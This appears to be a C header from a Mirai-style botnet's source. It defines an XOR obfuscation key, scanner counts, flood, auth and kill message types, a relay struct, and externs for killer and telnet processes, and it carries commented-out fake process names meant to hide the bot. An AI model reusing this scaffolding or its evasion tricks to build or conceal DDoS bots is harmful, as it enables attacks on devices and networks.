#pragma once
//#pragma GCC diagnostic ignored "-Wint-to-pointer-cast"
//#pragma GCC diagnostic ignored "-Wunused-result"

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

enum
{
    STDIN = 0,
    STDOUT = 1,
    STDERR = 2,
    FALSE = 0,
    TRUE = 1,
    SINGLE_INSTANCE_PORT = 33249,
    XOR_KEY = 0xDEDEEAED,
    TOTAL_SCANNERS = 3,
    MAXIMUM_DNS_QUERY_TRIES = 10,
    TYPE_COMMAND = 0,
	TYPE_FLOOD = 1,
	TYPE_AUTH = 2,
	TYPE_KILL = 3
};

struct relay
{
	uint8_t type;
	uint16_t b1, b2, b3, b4, b5, b6;
	char buf[64];
};

typedef uint32_t ipv4_t;
typedef uint16_t port_t;
typedef char BOOL;

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))

// inet_addr() marco
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

ipv4_t LOCAL_ADDRESS;

#define GET_UID (getuid())

extern int main_pid1;
extern int main_pid2;
extern int watch_pid;
extern int killer_pid;
extern int tel_pid;

// Fake name to avoid sticking out like a sore thumb
//#define FAKE_NAME "-sh"
// Fake name for prctl() to hide /comm name
//#define FAKE_PRCTL_NAME "sh"

static BOOL check_runtime_name(char *);
